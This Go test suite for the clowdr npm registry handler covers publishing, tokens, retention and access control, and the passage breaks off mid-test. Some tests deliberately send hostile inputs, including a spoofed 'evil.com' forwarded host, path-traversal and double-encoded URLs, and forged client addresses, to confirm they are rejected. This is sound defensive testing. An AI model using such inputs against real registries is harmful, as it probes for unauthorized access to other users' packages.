package npm

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/veksa/clowdr/internal/config"
	"github.com/veksa/clowdr/internal/ingress"
	"github.com/veksa/clowdr/internal/store"
)

type env struct {
	t    *testing.T
	h    *Handler
	srv  *httptest.Server
	st   *store.Store
	cfg  config.NPMConf
	logs *syncBuf

	mu  sync.Mutex
	now time.Time
}

type syncBuf struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuf) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuf) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

func newEnv(t *testing.T) *env {
	t.Helper()
	dir := t.TempDir()
	st, err := store.Open(filepath.Join(dir, "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	e := &env{t: t, st: st, logs: &syncBuf{}, now: time.Date(2026, 11, 1, 12, 0, 0, 0, time.UTC),
		cfg: config.NPMConf{Publish: true, Keep: 3, Grace: config.Duration(14 * 24 * time.Hour), MaxPublish: 1 << 20}}
	e.h = &Handler{Store: st, Dir: filepath.Join(dir, "npm"), Log: slog.New(slog.NewTextHandler(e.logs, nil)),
		Config: func() config.NPMConf { return e.cfg },
		Now: func() time.Time {
			e.mu.Lock()
			defer e.mu.Unlock()
			return e.now
		}}
	e.srv = httptest.NewServer(e.h)
	t.Cleanup(e.srv.Close)
	return e
}

func (e *env) advance(d time.Duration) {
	e.mu.Lock()
	e.now = e.now.Add(d)
	e.mu.Unlock()
}

func (e *env) token(name string, scopes ...string) string {
	e.t.Helper()
	secret, _, err := e.h.CreateToken(name, scopes, 0, Actor{By: "test"})
	if err != nil {
		e.t.Fatal(err)
	}
	return secret
}

type resp struct {
	status int
	header http.Header
	body   []byte
}

func (r resp) json(t *testing.T) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal(r.body, &m); err != nil {
		t.Fatalf("%d %s: %v", r.status, r.body, err)
	}
	return m
}

func (e *env) do(method, path, token string, body []byte, hdr ...string) resp {
	e.t.Helper()
	req, err := http.NewRequest(method, e.srv.URL+path, bytes.NewReader(body))
	if err != nil {
		e.t.Fatal(err)
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	for i := 0; i+1 < len(hdr); i += 2 {
		req.Header.Set(hdr[i], hdr[i+1])
	}
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer res.Body.Close()
	b, _ := io.ReadAll(res.Body)
	return resp{res.StatusCode, res.Header, b}
}

// tgz builds an npm tarball: package/package.json plus extra files (path → content).
func tgz(t *testing.T, name, version string, extra ...string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	add := func(p, content string) {
		tw.WriteHeader(&tar.Header{Name: p, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg})
		tw.Write([]byte(content))
	}
	add("package/package.json", `{"name":"`+name+`","version":"`+version+`"}`)
	for i := 0; i+1 < len(extra); i += 2 {
		add(extra[i], extra[i+1])
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

// tarOf builds a gzipped tar of exactly the given entries (path, content, ...).
func tarOf(t *testing.T, entries ...string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for i := 0; i+1 < len(entries); i += 2 {
		tw.WriteHeader(&tar.Header{Name: entries[i], Mode: 0o644, Size: int64(len(entries[i+1])), Typeflag: tar.TypeReg})
		tw.Write([]byte(entries[i+1]))
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

type pubOpts struct {
	docName, docVersion string // the version object's name and version, if not the published ones
	integrity, shasum   string
	tags                map[string]string
	length              int64
	fields              map[string]any // extra fields of the version object
}

// publishBody builds the body `npm publish` sends.
func publishDoc(name, version string, data []byte, o pubOpts) []byte {
	s512 := sha512.Sum512(data)
	s1 := sha1.Sum(data)
	if o.integrity == "" {
		o.integrity = "sha512-" + base64.StdEncoding.EncodeToString(s512[:])
	}
	if o.shasum == "" {
		o.shasum = hex.EncodeToString(s1[:])
	}
	if o.docName == "" {
		o.docName = name
	}
	if o.docVersion == "" {
		o.docVersion = version
	}
	if o.tags == nil {
		o.tags = map[string]string{"latest": version}
	}
	if o.length == 0 {
		o.length = int64(len(data))
	}
	_, base, _ := strings.Cut(name, "/")
	doc := map[string]any{
		"_id": name, "name": name, "description": "test package", "dist-tags": o.tags, "access": nil,
		"versions": map[string]any{version: map[string]any{
			"name": o.docName, "version": o.docVersion, "description": "test package", "readme": "# hi",
			"dependencies": map[string]string{"left-pad": "^1.0.0"}, "scripts": map[string]string{"test": "true"},
			"_id":  name + "@" + version,
			"dist": map[string]any{"integrity": o.integrity, "shasum": o.shasum, "tarball": "http://localhost/" + name + "/-/" + base + "-" + version + ".tgz"},
		}},
		"_attachments": map[string]any{name + "-" + version + ".tgz": map[string]any{
			"content_type": "application/octet-stream", "data": base64.StdEncoding.EncodeToString(data), "length": o.length,
		}},
	}
	vo := doc["versions"].(map[string]any)[version].(map[string]any)
	for k, v := range o.fields {
		vo[k] = v
	}
	b, _ := json.Marshal(doc)
	return b
}

func (e *env) publish(token, name, version string) resp {
	e.t.Helper()
	return e.do("PUT", "/npm/"+strings.Replace(name, "/", "%2f", 1), token, publishDoc(name, version, tgz(e.t, name, version), pubOpts{}))
}

// noise is incompressible content, so a tarball really is as large as asked.
func noise(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return string(b)
}

// reset forgets failed authentications; the access matrix makes many on purpose.
func (l *limiter) reset() {
	l.mu.Lock()
	l.m = nil
	l.order.Init()
	l.mu.Unlock()
}

func mustStatus(t *testing.T, r resp, want int) {
	t.Helper()
	if r.status != want {
		t.Fatalf("status %d, want %d: %s", r.status, want, r.body)
	}
}

func TestPublishAndInstall(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	data := tgz(t, "@acme/tool", "1.2.3", "package/index.js", "module.exports = 1")
	r := e.do("PUT", "/npm/@acme%2ftool", pub, publishDoc("@acme/tool", "1.2.3", data, pubOpts{}))
	mustStatus(t, r, 201)

	host := strings.TrimPrefix(e.srv.URL, "http://")
	for _, path := range []string{"/npm/@acme%2ftool", "/npm/@acme%2Ftool", "/npm/@acme/tool"} {
		r := e.do("GET", path, pub, nil)
		mustStatus(t, r, 200)
		doc := r.json(t)
		if doc["name"] != "@acme/tool" || doc["_id"] != "@acme/tool" || doc["description"] != "test package" {
			t.Fatalf("%s: %s", path, r.body)
		}
		if doc["dist-tags"].(map[string]any)["latest"] != "1.2.3" {
			t.Fatalf("dist-tags: %s", r.body)
		}
		v := doc["versions"].(map[string]any)["1.2.3"].(map[string]any)
		dist := v["dist"].(map[string]any)
		s512 := sha512.Sum512(data)
		if dist["integrity"] != "sha512-"+base64.StdEncoding.EncodeToString(s512[:]) {
			t.Fatalf("integrity: %v", dist)
		}
		if dist["tarball"] != "http://"+host+"/npm/@acme/tool/-/tool-1.2.3.tgz" {
			t.Fatalf("tarball URL: %v", dist["tarball"])
		}
		if v["readme"] != "# hi" || doc["time"].(map[string]any)["1.2.3"] == nil {
			t.Fatalf("full document: %s", r.body)
		}
	}

	r = e.do("GET", "/npm/@acme%2ftool", pub, nil, "Accept", "application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8, */*")
	mustStatus(t, r, 200)
	if ct := r.header.Get("Content-Type"); ct != mtAbbreviated {
		t.Fatalf("content type %s", ct)
	}
	doc := r.json(t)
	v := doc["versions"].(map[string]any)["1.2.3"].(map[string]any)
	if v["readme"] != nil || v["scripts"] != nil || v["dependencies"] == nil || v["dist"] == nil || doc["modified"] == nil || doc["time"] != nil {
		t.Fatalf("abbreviated: %s", r.body)
	}

	r = e.do("GET", "/npm/@acme/tool/-/tool-1.2.3.tgz", pub, nil)
	mustStatus(t, r, 200)
	if !bytes.Equal(r.body, data) {
		t.Fatal("tarball bytes differ")
	}
	r = e.do("GET", "/npm/@acme%2ftool/-/tool-1.2.3.tgz", pub, nil)
	mustStatus(t, r, 200)
	sum := sha512.Sum512(data)
	if _, err := os.Stat(filepath.Join(e.h.Dir, "tarballs", hex.EncodeToString(sum[:]))); err != nil {
		t.Fatal("tarball not stored under its sha512:", err)
	}
	mustStatus(t, e.do("GET", "/npm/@acme/tool/-/tool-9.9.9.tgz", pub, nil), 404)
	mustStatus(t, e.do("HEAD", "/npm/@acme/tool", pub, nil), 200)

	// Behind nginx (a trusted peer) URLs follow X-Forwarded-Host and -Proto.
	r = e.do("GET", "/npm/@acme/tool", pub, nil, "X-Forwarded-Host", "deploy.127-0-0-1.sslip.io:11543", "X-Forwarded-Proto", "https")
	if !strings.Contains(string(r.body), `"https://deploy.127-0-0-1.sslip.io:11543/npm/@acme/tool/-/tool-1.2.3.tgz"`) {
		t.Fatalf("forwarded host: %s", r.body)
	}
	r = e.do("GET", "/npm/@acme/tool", pub, nil, "X-Forwarded-Host", "evil.com/x\"", "X-Forwarded-Proto", "gopher")
	if !strings.Contains(string(r.body), `"http://`+host+`/npm/`) {
		t.Fatalf("bad forwarded headers used: %s", r.body)
	}

	r = e.do("GET", "/npm/-/whoami", pub, nil)
	if r.status != 200 || r.json(t)["username"] != "ci" {
		t.Fatalf("whoami: %d %s", r.status, r.body)
	}
	r = e.do("POST", "/npm/-/npm/v1/security/advisories/bulk", pub, []byte(`{"@acme/tool":["1.2.3"]}`))
	if r.status != 200 || strings.TrimSpace(string(r.body)) != "{}" {
		t.Fatalf("advisories: %d %s", r.status, r.body)
	}
	mustStatus(t, e.do("GET", "/npm/-/ping", pub, nil), 200)
}

// A peer that is not nginx or the host itself cannot choose the URLs in documents or the
// address in the audit log.
func TestForwardedHeadersOnlyFromTrustedPeers(t *testing.T) {
	r := httptest.NewRequest("GET", "/npm/@a/b", nil)
	r.Host = "deploy.example.com"
	r.Header.Set("X-Forwarded-Host", "evil.example")
	r.Header.Set("X-Forwarded-Proto", "https")
	r.Header.Set("X-Forwarded-For", "10.9.9.9")
	r.RemoteAddr = "203.0.113.7:4444"
	if got := BaseURL(r); got != "http://deploy.example.com" {
		t.Fatal(got)
	}
	if got := ClientAddr(r); got != "203.0.113.7" {
		t.Fatal(got)
	}
	// Through the socket but not from the deploy host's location (an ACME location, say):
	// the headers are the client's own and are ignored.
	r.RemoteAddr = "@"
	if got := BaseURL(r); got != "http://deploy.example.com" {
		t.Fatal(got)
	}
	if got := ClientAddr(r); got != "local" {
		t.Fatal(got)
	}
	r.Header.Set(ingress.ViaHeader, ingress.ViaDeployHost)
	if got := BaseURL(r); got != "https://evil.example" {
		t.Fatal(got)
	}
	if got := ClientAddr(r); got != "10.9.9.9" {
		t.Fatal(got)
	}
}

// Failed logins sent with someone else's address in X-Forwarded-For, through a route that is
// not the deploy host's, count against the sender's own bucket, not the victim's.
func TestForgedAddressCannotLockOutOthers(t *testing.T) {
	e := newEnv(t)
	good := e.token("ci", "npm:read:@acme/*")
	serve := func(token string, marked bool) int {
		r := httptest.NewRequest("GET", "/npm/-/whoami", nil)
		r.RemoteAddr = "@"
		r.Header.Set("X-Forwarded-For", "198.51.100.77")
		if marked {
			r.Header.Set(ingress.ViaHeader, ingress.ViaDeployHost)
		}
		r.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		e.h.ServeHTTP(w, r)
		return w.Code
	}
	for i := 0; i < failMax+5; i++ {
		serve("clwn_bad_bad", false)
	}
	if got := serve(good, true); got != 200 {
		t.Fatalf("the victim's address was locked out by forged headers: %d", got)
	}
}

func TestPublishChecks(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	name, ver := "@acme/tool", "1.0.0"
	good := tgz(t, name, ver)
	other := tgz(t, name, "1.0.1")
	evil := tgz(t, name, ver, "package/package.json", `{"name":"@acme/tool","version":"6.6.6"}`)
	mustStatus(t, e.publish(pub, name, "0.9.0"), 201)

	cases := []struct {
		what   string
		path   string
		body   []byte
		status int
	}{
		{"name in the body differs from the URL", "/npm/@acme%2ftool", publishDoc("@acme/other", ver, good, pubOpts{}), 400},
		{"version object of another package", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{docName: "@acme/other"}), 400},
		{"version object of another version", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{docVersion: "1.0.1"}), 400},
		{"integrity of other bytes", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{integrity: "sha512-" + base64.StdEncoding.EncodeToString(make([]byte, 64))}), 400},
		{"sha1 integrity only", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{integrity: "sha1-AAAA"}), 400},
		{"shasum of other bytes", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{shasum: strings.Repeat("0", 40)}), 400},
		{"length differs", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{length: 3}), 400},
		{"tarball of another version", "/npm/@acme%2ftool", publishDoc(name, ver, other, pubOpts{}), 400},
		{"second package.json in the tarball", "/npm/@acme%2ftool", publishDoc(name, ver, evil, pubOpts{}), 400},
		{"not a tarball", "/npm/@acme%2ftool", publishDoc(name, ver, []byte("hello"), pubOpts{}), 400},
		{"dist-tag at another version", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{tags: map[string]string{"latest": "0.9.0"}}), 400},
		{"dist-tag that reads as a version", "/npm/@acme%2ftool", publishDoc(name, ver, good, pubOpts{tags: map[string]string{"1.0": ver}}), 400},
		{"version not semver", "/npm/@acme%2ftool", publishDoc(name, "1.0", tgz(t, name, "1.0"), pubOpts{}), 400},
		{"not JSON", "/npm/@acme%2ftool", []byte("{"), 400},
		{"unscoped name", "/npm/tool", publishDoc("tool", ver, tgz(t, "tool", ver), pubOpts{}), 400},
		{"upper case name", "/npm/@acme%2fTool", publishDoc("@acme/Tool", ver, tgz(t, "@acme/Tool", ver), pubOpts{}), 400},
		{"existing version", "/npm/@acme%2ftool", publishDoc(name, "0.9.0", tgz(t, name, "0.9.0"), pubOpts{}), 409},
		{"over the size limit", "/npm/@acme%2ftool", publishDoc(name, ver, tgz(t, name, ver, "package/big", noise(2<<20)), pubOpts{}), 413},
	}
	for _, c := range cases {
		r := e.do("PUT", c.path, pub, c.body)
		if r.status != c.status {
			t.Errorf("%s: %d %s, want %d", c.what, r.status, r.body, c.status)
		}
	}
	// None of the refused publishes left a version behind.
	if vs, _ := e.st.NPMVersions(name); len(vs) != 1 {
		t.Fatalf("versions after refused publishes: %+v", vs)
	}
	// An over-limit body without Content-Length is cut while reading.
	big := publishDoc(name, ver, tgz(t, name, ver, "package/big", noise(2<<20)), pubOpts{})
	req, _ := http.NewRequest("PUT", e.srv.URL+"/npm/@acme%2ftool", io.MultiReader(bytes.NewReader(big)))
	req.ContentLength = -1
	req.Header.Set("Authorization", "Bearer "+pub)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	if res.StatusCode != 413 {
		t.Fatalf("chunked over-limit body: %d", res.StatusCode)
	}

	// Rights and the server switch.
	reader := e.token("reader", "npm:read:@acme/*")
	stranger := e.token("stranger", "npm:publish:@other/*")
	mustStatus(t, e.publish(reader, name, "2.0.0"), 403)
	mustStatus(t, e.publish(stranger, name, "2.0.0"), 404)
	e.cfg.Publish = false
	r := e.publish(pub, name, "2.0.0")
	mustStatus(t, r, 405)
	if !strings.Contains(string(r.body), "npm.publish") {
		t.Fatalf("message: %s", r.body)
	}
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme%2ftool/dist-tags/beta", pub, []byte(`"0.9.0"`)), 405)
	mustStatus(t, e.do("GET", "/npm/@acme/tool", pub, nil), 200) // reads still work
	mustStatus(t, e.do("DELETE", "/npm/@acme%2ftool/-rev/1-abc", pub, nil), 405)
}

func TestDistTags(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/tool")
	reader := e.token("reader", "npm:read:@acme/*")
	mustStatus(t, e.publish(pub, "@acme/tool", "1.0.0"), 201)
	mustStatus(t, e.publish(pub, "@acme/tool", "1.1.0"), 201)

	mustStatus(t, e.do("PUT", "/npm/-/package/@acme%2ftool/dist-tags/stable", pub, []byte(`"1.0.0"`)), 200)
	r := e.do("GET", "/npm/-/package/@acme%2ftool/dist-tags", reader, nil)
	mustStatus(t, r, 200)
	if tags := r.json(t); tags["stable"] != "1.0.0" || tags["latest"] != "1.1.0" {
		t.Fatalf("%s", r.body)
	}
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme/tool/dist-tags/stable", reader, []byte(`"1.1.0"`)), 403)
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme/tool/dist-tags/stable", pub, []byte(`"7.0.0"`)), 404)
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme/tool/dist-tags/stable", pub, []byte(`7`)), 400)
	mustStatus(t, e.do("DELETE", "/npm/-/package/@acme/tool/dist-tags/latest", pub, nil), 400)
	mustStatus(t, e.do("DELETE", "/npm/-/package/@acme/tool/dist-tags/stable", pub, nil), 200)
	mustStatus(t, e.do("DELETE", "/npm/-/package/@acme/tool/dist-tags/stable", pub, nil), 404)
	r = e.do("GET", "/npm/@acme/tool", reader, nil)
	if strings.Contains(string(r.body), "stable") {
		t.Fatalf("tag not removed: %s", r.body)
	}
}

func TestRetention(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*")
	for _, v := range []string{"1.0.0", "1.1.0", "1.2.0"} {
		mustStatus(t, e.publish(pub, "@acme/tool", v), 201)
	}
	deprecated := func() map[string]string {
		r := e.do("GET", "/npm/@acme/tool", pub, nil)
		mustStatus(t, r, 200)
		out := map[string]string{}
		for v, m := range r.json(t)["versions"].(map[string]any) {
			if d, ok := m.(map[string]any)["deprecated"].(string); ok {
				out[v] = d
			}
		}
		return out
	}
	if d := deprecated(); len(d) != 0 {
		t.Fatalf("three versions, nothing to deprecate: %v", d)
	}
	// A fourth version by semver deprecates the first; a prerelease of an old line counts too.
	mustStatus(t, e.publish(pub, "@acme/tool", "1.3.0"), 201)
	d := deprecated()
	if len(d) != 1 || d["1.0.0"] != "removed on 2026-11-15, upgrade to 1.3.0" {
		t.Fatalf("%v", d)
	}
	// A dist-tag keeps a version.
	mustStatus(t, e.do("PUT", "/npm/-/package/@acme%2ftool/dist-tags/lts", pub, []byte(`"1.0.0"`)), 200)
	if d := deprecated(); len(d) != 0 {
		t.Fatalf("tagged version still deprecated: %v", d)
	}
	mustStatus(t, e.do("DELETE", "/npm/-/package/@acme%2ftool/dist-tags/lts", pub, nil), 200)
	if d := deprecated(); len(d) != 1 {
		t.Fatalf("untagged version not deprecated again: %v", d)
	}

	vs, _ := e.st.NPMVersion("@acme/tool", "1.0.0")
	file, _ := e.h.tarPath(vs.SHA512)
	e.h.Sweep(t.Context())
	mustStatus(t, e.do("GET", "/npm/@acme/tool/-/tool-1.0.0.tgz", pub, nil), 200) // still in grace

	e.advance(14*24*time.Hour + time.Minute)
	e.h.Sweep(t.Context())
	mustStatus(t, e.do("GET", "/npm/@acme/tool/-/tool-1.0.0.tgz", pub, nil), 404)
	r := e.do("GET", "/npm/@acme/tool", pub, nil)
	if strings.Contains(string(r.body), `"1.0.0"`) || !strings.Contains(string(r.body), `"1.1.0"`) {
		t.Fatalf("after the sweep: %s", r.body)
	}
	if _, err := os.Stat(file); !os.IsNotExist(err) {
		t.Fatalf("tarball file kept: %v", err)
	}
	// Immutable even after deletion.
	r = e.publish(pub, "@acme/tool", "1.0.0")
	mustStatus(t, r, 409)
	if !strings.Contains(string(r.body), "removed") {
		t.Fatalf("%s", r.body)
	}
}

func TestTokenLifecycle(t *testing.T) {
	e := newEnv(t)
	if _, _, err := e.h.CreateToken("bad name!", []string{"plugins:read"}, 0, Actor{}); err == nil {
		t.Fatal("bad name accepted")
	}
	if _, _, err := e.h.CreateToken("x", []string{"npm:read:*"}, 0, Actor{}); err == nil {
		t.Fatal("bad scope accepted")
	}
	if _, _, err := e.h.CreateToken("x", nil, 0, Actor{}); err == nil {
		t.Fatal("no scopes accepted")
	}
	old := e.token("laptop", "npm:read:@acme/*")
	if _, _, err := e.h.CreateToken("laptop", []string{"plugins:read"}, 0, Actor{}); err != ErrTokenExists {
		t.Fatalf("duplicate name: %v", err)
	}

	// LastUsed is written at most once a minute.
	mustStatus(t, e.do("GET", "/npm/-/whoami", old, nil), 200)
	ts, _ := e.st.NPMTokens()
	first := ts[0].LastUsed
	if !first.Equal(e.now) {
		t.Fatalf("last used %v", first)
	}
	e.advance(30 * time.Second)
	mustStatus(t, e.do("GET", "/npm/-/whoami", old, nil), 200)
	if ts, _ := e.st.NPMTokens(); !ts[0].LastUsed.Equal(first) {
		t.Fatal("last used written again within a minute")
	}

	// Self-rotation: the new token works, the old one for 24 h more, and cannot rotate again.
	r := e.do("POST", "/npm/-/clowdr/token/rotate", old, nil)
	mustStatus(t, r, 200)
	var tr TokenResponse
	json.Unmarshal(r.body, &tr)
	if tr.Info.Name != "laptop" || tr.Info.RotatedFrom == "" || tr.Info.Hash != "" || strings.Contains(string(r.body), `"hash"`) {
		t.Fatalf("%s", r.body)
	}
	mustStatus(t, e.do("GET", "/npm/-/whoami", tr.Token, nil), 200)
	mustStatus(t, e.do("GET", "/npm/-/whoami", old, nil), 200)
	mustStatus(t, e.do("POST", "/npm/-/clowdr/token/rotate", old, nil), 409)
	e.advance(24*time.Hour + time.Second)
	mustStatus(t, e.do("GET", "/npm/-/whoami", old, nil), 401)
	mustStatus(t, e.do("GET", "/npm/-/whoami", tr.Token, nil), 200)
	e.h.Sweep(t.Context())
	if ts, _ := e.st.NPMTokens(); len(ts) != 1 {
		t.Fatalf("rotated token past grace not swept: %+v", ts)
	}

	// Admin rotation with --now kills the old token at once; the lifetime carries over.
	secret, nt, err := e.h.RotateToken("laptop", true, Actor{By: "admin:x"})
	if err != nil {
		t.Fatal(err)
	}
	if got := nt.Expires.Sub(nt.Created); got != 365*24*time.Hour {
		t.Fatalf("lifetime %v", got)
	}
	mustStatus(t, e.do("GET", "/npm/-/whoami", tr.Token, nil), 401)
	mustStatus(t, e.do("GET", "/npm/-/whoami", secret, nil), 200)
	if _, _, err := e.h.RotateToken("nobody", false, Actor{}); err != store.ErrNotFound {
		t.Fatalf("rotate unknown: %v", err)
	}

	// Revocation takes effect on the next request, for every token of the name.
	s2, _, _ := e.h.RotateToken("laptop", false, Actor{})
	if err := e.h.RevokeToken("laptop", Actor{By: "admin:x"}); err != nil {
		t.Fatal(err)
	}
	mustStatus(t, e.do("GET", "/npm/-/whoami", secret, nil), 401)
	mustStatus(t, e.do("GET", "/npm/-/whoami", s2, nil), 401)
	if err := e.h.RevokeToken("laptop", Actor{}); err != store.ErrNotFound {
		t.Fatalf("revoke twice: %v", err)
	}

	// Expiry.
	short, _, _ := e.h.CreateToken("short", []string{"plugins:read"}, time.Hour, Actor{})
	mustStatus(t, e.do("GET", "/npm/-/whoami", short, nil), 200)
	e.advance(time.Hour)
	mustStatus(t, e.do("GET", "/npm/-/whoami", short, nil), 401)

	es, _ := e.h.Audit(AuditFilter{Action: "token"})
	actions := map[string]int{}
	for _, a := range es {
		actions[a.Action]++
	}
	if actions["token.create"] != 2 || actions["token.rotate"] != 3 || actions["token.revoke"] != 1 {
		t.Fatalf("token audit: %v", actions)
	}
}

// TestAccessMatrix: every request that may not see a package gets no data, and the token
// shows up in no answer and no log line.
func TestAccessMatrix(t *testing.T) {
	e := newEnv(t)
	pub := e.token("ci", "npm:publish:@acme/*", "npm:publish:@other/*")
	mustStatus(t, e.publish(pub, "@acme/tool", "1.0.0"), 201)
	mustStatus(t, e.publish(pub, "@other/secret", "1.0.0"), 201)

	wrongScope := e.token("wrong", "npm:read:@nope/*", "plugins:read")
	onlyOther := e.token("other", "npm:read:@acme/tool")
	expired, _, _ := e.h.CreateToken("expired", []string{"npm:read:@acme/*"}, time.Minute, Actor{})
	revoked := e.token("revoked", "npm:read:@acme/*")
	e.h.RevokeToken("revoked", Actor{})
	rotated := e.token("rotated", "npm:read:@acme/*")
	if _, _, err := e.h.RotateToken("rotated", false, Actor{}); err != nil {
		t.Fatal(err)
	}
	e.advance(25 * time.Hour)
	all := []string{pub, wrongScope, onlyOther, expired, revoked, rotated}

	type tc struct {
		who, token, method, path string
		status                   int
	}
	var cases []tc
	unauth := []struct{ who, token string }{{"no token", ""}, {"garbage", "clwn_zz_zz"}, {"expired", expired}, {"revoked", revoked},
		{"rotated after grace", rotated}, {"admin-shaped", "clw_abc_def"}}
	reads := []string{"/npm/@acme/tool", "/npm/@acme%2ftool", "/npm/@acme/tool/-/tool-1.0.0.tgz", "/npm/-/package/@acme%2ftool/dist-tags",
		"/npm/-/whoami", "/npm/-/ping", "/npm/@nope/x"}
	for _, u := range unauth {
		for _, p := range reads {
			cases = append(cases, tc{u.who, u.token, "GET", p, 401})
		}
		cases = append(cases, tc{u.who, u.token, "PUT", "/npm/@acme%2ftool", 401}, tc{u.who, u.token, "POST", "/npm/-/npm/v1/security/advisories/bulk", 401},
			tc{u.who, u.token, "POST", "/npm/-/clowdr/token/rotate", 401})
	}
	for _, p := range []string{"/npm/@acme/tool", "/npm/@acme%2ftool", "/npm/@acme/tool/-/tool-1.0.0.tgz", "/npm/@acme%2ftool/-/tool-1.0.0.tgz",
		"/npm/-/package/@acme%2ftool/dist-tags", "/npm/-/package/@acme/tool/dist-tags"} {
		cases = append(cases, tc{"wrong scope", wrongScope, "GET", p, 404})
	}
	for _, p := range []string{
		"/npm/@other/secret", "/npm/@other%2fsecret", "/npm/@other/secret/-/secret-1.0.0.tgz", // another scope, guessed URL
		"/npm/@acme/tool/-/../../@other/secret",         // dot segments (cleaned by the client or refused)
		"/npm/@acme/tool/-/%2e%2e/%2e%2e/@other/secret", // escaped dot segments
		"/npm/@acme%2f..%2f@other%2fsecret",             // escaped traversal inside the name
		"/npm/@acme%252ftool", "/npm/%40other%2fsecret", // double encoding; escaped @ of another scope
		"/npm/@acme/tool/-/secret-1.0.0.tgz",              // another package's file name under a readable one
		"/npm/@acme/tool/-/tool-1.0.0.tgz%2f..%2f..%2f..", // junk after the file name
		"/npm/-/package/@other%2fsecret/dist-tags",
		"/npm/@OTHER/secret", "/npm/secret", "/npm/@other",
	} {
		cases = append(cases, tc{"read @acme/tool only", onlyOther, "GET", p, 404})
	}
	cases = append(cases, tc{"read @acme/tool only", onlyOther, "PUT", "/npm/-/package/@other%2fsecret/dist-tags/x", 404})

	for _, c := range cases {
		e.h.limiter.reset()
		r := e.do(c.method, c.path, c.token, nil)
		if r.status != c.status {
			t.Errorf("%s %s as %s: %d %s, want %d", c.method, c.path, c.who, r.status, r.body, c.status)
		}
		if r.status == 401 && r.header.Get("WWW-Authenticate") != `Bearer realm="clowdr"` {
			t.Errorf("%s as %s: WWW-Authenticate %q", c.path, c.who, r.header.Get("WWW-Authenticate"))
		}
		if strings.Contains(string(r.body), "secret\"") || strings.Contains(string(r.body), "1.0.0") {
			t.Errorf("%s %s as %s leaked data: %s", c.method, c.path, c.who, r.body)
		}
		for _, tok := range all {
			if strings.Contains(string(r.body), tok) || strings.Contains(r.header.Get("WWW-Authenticate"), tok) {
				t.Errorf("%s as %s: the token is in the answer", c.path, c.who)
			}
		}
	}
	// A 404 for a package without rights is the same as for one that does not exist.
	a, b := e.do("GET", "/npm/@other/secret", onlyOther, nil), e.do("GET", "/npm/@acme/nothing", onlyOther, nil)
	if a.status != b.status || !bytes.Equal(a.body, b.body) {
		t.Errorf("distinguishable 404s: %s / %s", a.body, b.body)
	}
	// Basic auth carries the token as the password.
	req, _ := http.NewRequest("GET", e.srv.URL+"/npm/@acme/tool", nil)
	req.SetBasicAuth("anyone", onlyOther)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	if res.StatusCode != 200 {
		t.Errorf("basic auth: %d", res.StatusCode)
	}
	for _, tok := range all {
		if strings.Contains(e.logs.String(), tok) {
			t.Error("a token is in the log")
		}
	}
}

func TestFailedAuthRateLimit(t *testing.T) {
	e := newEnv(t)
	good := e.token("ci", "npm:read:@acme/*")
	for i := 0; i < failMax; i++ {
		mustStatus(t, e.do("GET", "/npm/-/whoami", "clwn_bad_bad", nil), 401)
	}
	mustStatus(t, e.do("GET", "/npm/-/whoami", good, nil), 429)
	// Another address is not affected.
	r := httptest.NewRequest("GET", "/npm/-/whoami", nil)
	r.RemoteAddr = "198.51.100.1:5555"
	r.Header.Set("Authorization", "Bearer "+good)
	w := httptest.NewRecorder()
	e.h.ServeHTTP(w, r)
	if w.Code != 200 {
		t.Fatalf("other address: %d", w.Code)
	}
	e.advance(failWindow + time.Second)
	mustStatus(t, e.do("GET", "/npm/-/whoami", good, nil), 200)
}

func TestLoginRoute(t *testing.T) {
	e := newEnv(t)
	tok := e.token("ci", "npm:read:@acme/*")
	body := []byte(`{"name":"me","password":"pw"}`)
	r := e.do("PUT", "/npm/-/user/org.couchdb.user:me", "", body)
	mustStatus(t, r, 401)
	if !strings.Contains(string(r.body), "clowctl npm login") {
		t.Fatalf("%s", r.body)
	}
	r = e.do("PUT", "/npm/-/user/org.couchdb.user:me", tok, body)
	mustStatus(t, r, 400)
	if !strings.Contains(string(r.body), "clowctl npm login") || strings.Contains(string(r.body), "pw") {
